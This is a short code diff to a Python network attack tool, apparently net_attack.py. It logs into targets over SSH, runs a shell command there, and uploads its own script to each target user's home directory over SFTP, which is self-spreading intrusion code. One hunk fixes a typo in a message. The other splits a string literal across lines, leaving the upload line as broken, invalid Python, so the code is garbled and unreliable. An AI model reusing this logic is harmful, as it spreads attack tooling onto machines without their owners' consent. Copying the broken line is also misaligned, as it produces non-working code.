@@ -42,7 +42,7 @@ def main():
 
     if len(sys.argv)==1: # Checks if the length of the arguments are exactly equal to one
 
-        print("TThis tool requires some CLI arguments to perform.")
+        print("This tool requires some CLI arguments to perform.")
         help()
         sys.exit()
 
@@ -234,7 +234,8 @@ def main():
                                 stdin, stdout, stderr=ssh_client.exec_command("ls \n")      # Firing a command from the target's shell to see the list of file that are being displayed
                                 print(stdout.readlines())
                                 ftp_client=ssh_client.open_sftp()       # Setting up an FTP server to send the files from the Paramiko library
-                                ftp_client.put('net_attack.py','/home/'+username +'/net_attack.py')     #The file is being sent to the target 
+                                ftp_client.put('
+                                               .py','/home/'+username +'/net_attack.py')     #The file is being sent to the target 
                                 print("\x1b[0;30;42m"f"[->]File successfully transferred!"+"\x1b[0m\n")
                                 ftp_client.close()      # The FTP session is ended
 
